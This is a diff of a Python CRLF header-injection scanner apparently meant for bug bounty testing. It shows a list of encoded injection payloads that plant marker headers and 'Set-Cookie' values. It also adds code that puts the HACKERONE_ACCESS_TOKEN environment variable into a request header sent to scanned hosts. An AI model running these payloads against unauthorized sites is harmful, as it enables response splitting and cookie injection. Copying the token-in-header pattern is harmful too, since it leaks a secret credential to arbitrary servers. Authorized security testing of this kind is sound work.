@@ -1,4 +1,6 @@
 from lib.ColoredObject import Color as Cobj
+from os import getenv
+
 payloads = [
 "/%0aevil-here:bugbountyplz",
 "/%0d%0aevil-here:bugbountyplz",
@@ -17,12 +19,16 @@ payloads = [
 "/%3B%0aSet-Cookie:bugbounty=bugbountyplz",
 "/%E5%98%8A%E5%98%8DSet-Cookie:bugbounty=bugbountyplz",
 ]
-UA = {
-    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36',
-    'X-Bug-Bounty': 'machinexa'
-}
-ColorObj = Cobj()
 
+Headers = {
+    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36'
+}
+try:
+    Headers['X-Bug-Bounty'] = getenv('HACKERONE_ACCESS_TOKEN')
+except Exception:
+    pass
+
+ColorObj = Cobj()
 to_try = []
 
 #"/%23%0aevil-here:bugbountyplz",
